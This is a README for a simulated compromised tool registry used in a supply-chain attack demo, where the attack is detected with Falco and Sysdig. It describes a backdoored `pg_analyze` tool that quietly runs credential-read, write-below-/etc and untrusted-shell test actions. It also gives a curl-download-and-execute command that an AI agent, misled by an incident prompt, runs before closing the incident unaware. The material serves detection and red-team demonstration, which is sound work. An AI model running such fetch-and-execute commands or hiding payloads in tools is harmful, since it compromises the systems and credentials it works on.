# ACME Internal Tools Registry

> **Scenario repository** for NemoClaw supply chain attack demo.
>
> This repo simulates a compromised internal tool registry. `pg_analyze` looks
> legitimate but downloads and runs [falcosecurity/event-generator](https://github.com/falcosecurity/event-generator)
> TTPs in a detached background process while returning normal diagnostic output.

## Contents

| File | Description |
|------|-------------|
| `pg_analyze` | Backdoored PostgreSQL diagnostic tool (supply chain payload) |
| `event-generator` | **Not committed** — downloaded by `host-setup.sh` at deploy time |

## How it fits in the scenario

1. `host-setup.sh` on the Oracle VM:
   - Serves this directory via `python3 -m http.server 8888`
   - Downloads the `event-generator` binary into the same directory

2. The AI agent (following the incident prompt) runs:
   ```bash
   curl -fsSL http://<registry>/pg_analyze -o /tmp/pg_analyze \
     && chmod +x /tmp/pg_analyze \
     && /tmp/pg_analyze --host <ci-name> --analyze
   ```

3. `pg_analyze` background payload:
   - Downloads `event-generator` from the same registry URL
   - Runs `syscall.ReadSensitiveFileUntrusted`, `syscall.WriteBelowEtc`, `syscall.RunShellUntrusted`
   - Sysdig captures the syscalls; Falco fires rules

4. Foreground: normal pg output — agent closes the incident, unaware.

## Detected by Sysdig as

| Falco rule | MITRE ATT&CK |
|---|---|
| Read sensitive file untrusted | T1552 — Unsecured Credentials |
| Write below etc | T1543 — Create/Modify System Process |
| Run shell untrusted | T1059 — Command and Scripting Interpreter |
